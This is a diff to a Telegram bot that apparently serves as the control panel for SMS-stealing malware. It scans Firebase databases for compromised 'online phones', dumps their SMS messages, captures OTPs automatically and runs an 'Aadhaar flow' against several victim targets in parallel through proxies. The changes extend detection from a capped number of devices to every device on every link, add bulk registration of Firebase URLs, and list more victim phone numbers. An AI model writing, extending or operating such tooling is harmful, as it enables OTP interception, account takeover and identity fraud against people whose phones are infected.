@@ -1182,11 +1182,62 @@ def cmd_addfire(message):
 
     parts = message.text.split(maxsplit=1)
     if len(parts) < 2:
-        bot.send_message(chat_id, "ℹ️ <b>Usage:</b> <code>/addfire https://your-db.firebaseio.com/</code>", parse_mode='HTML')
+        bot.send_message(
+            chat_id,
+            "ℹ️ <b>Usage:</b>\n"
+            "<code>/addfire https://db1.firebaseio.com/</code>\n"
+            "or multiple URLs separated by space/newline/comma:\n"
+            "<code>/addfire url1 url2 url3</code>",
+            parse_mode='HTML'
+        )
         return
 
-    success, msg = aadhaar_engine.firebase_add_link(parts[1].strip(), added_by=chat_id)
-    bot.send_message(chat_id, msg, parse_mode='HTML')
+    raw = parts[1].strip()
+
+    # Split by whitespace, commas, semicolons, or newlines
+    candidates = re.split(r'[\s,;]+', raw)
+    candidates = [c.strip() for c in candidates if c.strip()]
+
+    if not candidates:
+        bot.send_message(chat_id, "❌ No valid URLs found in your message.")
+        return
+
+    added, skipped, failed = [], [], []
+
+    for cand in candidates:
+        try:
+            ok, msg = aadhaar_engine.firebase_add_link(cand, added_by=chat_id)
+            if ok:
+                added.append(cand)
+            else:
+                if "already exists" in msg.lower():
+                    skipped.append(cand)
+                else:
+                    failed.append((cand, msg))
+        except Exception as e:
+            failed.append((cand, str(e)))
+
+    lines = []
+    if added:
+        lines.append(f"✅ <b>Added {len(added)} link(s):</b>")
+        for u in added:
+            short = u.replace("https://", "").replace("http://", "").rstrip("/")
+            lines.append(f"  • <code>{short}</code>")
+    if skipped:
+        lines.append(f"\n⚠️ <b>Skipped {len(skipped)} (already present):</b>")
+        for u in skipped:
+            short = u.replace("https://", "").replace("http://", "").rstrip("/")
+            lines.append(f"  • <code>{short}</code>")
+    if failed:
+        lines.append(f"\n❌ <b>Failed {len(failed)}:</b>")
+        for u, err in failed:
+            short = u.replace("https://", "").replace("http://", "").rstrip("/")
+            lines.append(f"  • <code>{short}</code> — {aadhaar_engine.escape_html(err)}")
+
+    if not lines:
+        lines.append("ℹ️ Nothing changed.")
+
+    bot.send_message(chat_id, "\n".join(lines), parse_mode='HTML')
 
 
 @bot.message_handler(commands=['removefire'])
@@ -1240,15 +1291,16 @@ def cmd_scan(message):
                 url = entry.get("url", "")
                 short = url.replace("https://", "").replace("http://", "").rstrip("/")
                 try:
-                    mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=40)
+                    # 🔍 DETECT ALL — limit_devices=None
+                    mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=None)
                     if mapping:
                         total_phones += len(mapping)
                         lines.append(f"🔗 <code>{short}</code>")
                         lines.append(f"   📱 <b>{len(mapping)}</b> phone(s) online")
-                        for ph in list(mapping.keys())[:5]:
+                        for ph in list(mapping.keys())[:10]:
                             lines.append(f"      ├ <code>{ph}</code>")
-                        if len(mapping) > 5:
-                            lines.append(f"      └ … +{len(mapping)-5} more")
+                        if len(mapping) > 10:
+                            lines.append(f"      └ … +{len(mapping)-10} more")
                     else:
                         lines.append(f"🔗 <code>{short}</code>\n   ⚠️ No phones found")
                 except Exception as e:
@@ -1340,7 +1392,7 @@ def cmd_resetused(message):
 def cmd_runall(message):
     """
     Scan all Firebase DBs, pick up to 5 online phones, and run the Aadhaar flow
-    for each in parallel (bb_auto style). Results are posted as they complete.
+    for each in parallel (5 concurrent). Results are posted as they complete.
     """
     chat_id = message.chat.id
     if chat_id not in ADMIN_IDS:
@@ -1375,7 +1427,7 @@ def cmd_runall(message):
         try:
             if explicit_targets:
                 targets = [{"phone": p, "url": None, "cid": None} for p in explicit_targets]
-                # Try to resolve url/cid for each
+                # Try to resolve url/cid for each — detect ALL devices per link
                 async with aiohttp.ClientSession() as session:
                     for t in targets:
                         for entry in links:
@@ -1383,7 +1435,7 @@ def cmd_runall(message):
                             if not url:
                                 continue
                             try:
-                                mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=60)
+                                mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=None)
                                 if t["phone"] in mapping:
                                     t["url"] = url
                                     t["cid"] = mapping[t["phone"]]
@@ -1391,7 +1443,8 @@ def cmd_runall(message):
                             except Exception:
                                 continue
             else:
-                targets = await aadhaar_engine.scan_all_firebase_phones(limit_per_link=40, max_targets=5)
+                # 🔍 Detect ALL online devices, return first 5 to process
+                targets = await aadhaar_engine.scan_all_firebase_phones(limit_per_link=None, max_targets=5)
 
             if not targets:
                 try:
@@ -1407,7 +1460,7 @@ def cmd_runall(message):
             preview_lines = [
                 "🎯 <b>BATCH PREVIEW</b>",
                 "━━━━━━━━━━━━━━━━━━━━━━",
-                f"👥 <b>{len(targets)}</b> target(s) will run in parallel:",
+                f"👥 <b>{len(targets)}</b> target(s) will run in parallel (max 5 concurrent):",
             ]
             for i, t in enumerate(targets, 1):
                 src = (t.get("url") or "manual").replace("https://", "").replace("http://", "").rstrip("/")
@@ -1526,7 +1579,8 @@ def cmd_debugusers(message):
             for entry in links:
                 url = entry.get("url", "")
                 short = url.replace("https://", "").replace("http://", "").rstrip("/")
-                mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=60)
+                # 🔍 DETECT ALL
+                mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=None)
                 total += len(mapping)
                 lines.append(f"\n🔗 <code>{short}</code> ({len(mapping)} phones)")
                 for phone in list(mapping.keys())[:20]:
@@ -1567,7 +1621,8 @@ def cmd_debugmsgs(message):
             for entry in links:
                 url = entry.get("url", "")
                 short = url.replace("https://", "").replace("http://", "").rstrip("/")
-                mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=40)
+                # 🔍 DETECT ALL
+                mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=None)
                 if not mapping:
                     lines.append(f"\n🔗 <code>{short}</code> — no devices")
                     continue
@@ -1765,19 +1820,19 @@ def cmd_help(message):
         "📖 <b>BOT COMMAND REFERENCE</b>\n"
         "━━━━━━━━━━━━━━━━━━━━━━\n\n"
         "🔥 <b>Firebase:</b>\n"
-        "  /addfire URL       — Add Firebase Realtime DB link\n"
+        "  /addfire URL       — Add 1 or more Firebase links\n"
         "  /removefire URL    — Remove a specific link\n"
         "  /removefire all    — Remove all links\n"
         "  /listfire          — List all configured links\n\n"
         "📱 <b>Auto-OTP:</b>\n"
-        "  /scan              — Scan Firebase for online devices\n"
+        "  /scan              — Scan Firebase for ALL online devices\n"
         "  /auto [N]          — Enable auto-OTP (optional target mobile N)\n"
         "  /stopauto          — Disable auto-OTP\n"
         "  /resetused         — Clear cached used-OTP registry\n"
-        "  /runall [N1,N2..]  — Scan all Firebase DBs & run 5 targets in parallel\n\n"
+        "  /runall [N1,N2..]  — Detect all online, process 5 in parallel\n\n"
         "🔬 <b>Debug:</b>\n"
         "  /debugscan         — Deep-scan Firebase endpoints\n"
-        "  /debugusers        — List all phones found on Firebase\n"
+        "  /debugusers        — List ALL phones found on Firebase\n"
         "  /debugmsgs [PHONE] — Dump latest SMS messages\n\n"
         "🌐 <b>Proxy:</b>\n"
         "  /reloadproxy       — Reload proxies.txt from disk\n"
@@ -2208,6 +2263,27 @@ def cleanup_temp_files():
 if __name__ == "__main__":
     # Clean leftover logs, captures, or profiles on startup
     cleanup_temp_files()
+
+    # ✅ CRITICAL: Remove any stale webhook before polling.
+    # Telegram returns 409 Conflict on getUpdates if a webhook is active.
+    try:
+        webhook_info = bot.get_webhook_info()
+        if webhook_info and webhook_info.url:
+            print(f"🌐 Found stale webhook: {webhook_info.url}")
+            print("🧹 Removing webhook to allow polling...")
+            bot.remove_webhook()
+            time.sleep(2)
+            print("✅ Webhook removed. Polling will work now.")
+        else:
+            print("✅ No active webhook. Safe to poll.")
+    except Exception as we:
+        print(f"⚠️ Webhook cleanup failed (continuing anyway): {we}")
+
+    # Extra safety: drop pending updates so old commands don't fire on restart
+    try:
+        bot.delete_webhook(drop_pending_updates=True)
+    except Exception as de:
+        print(f"⚠️ delete_webhook drop_pending failed: {de}")
 
     loop = asyncio.new_event_loop()
     def run_loop(l):
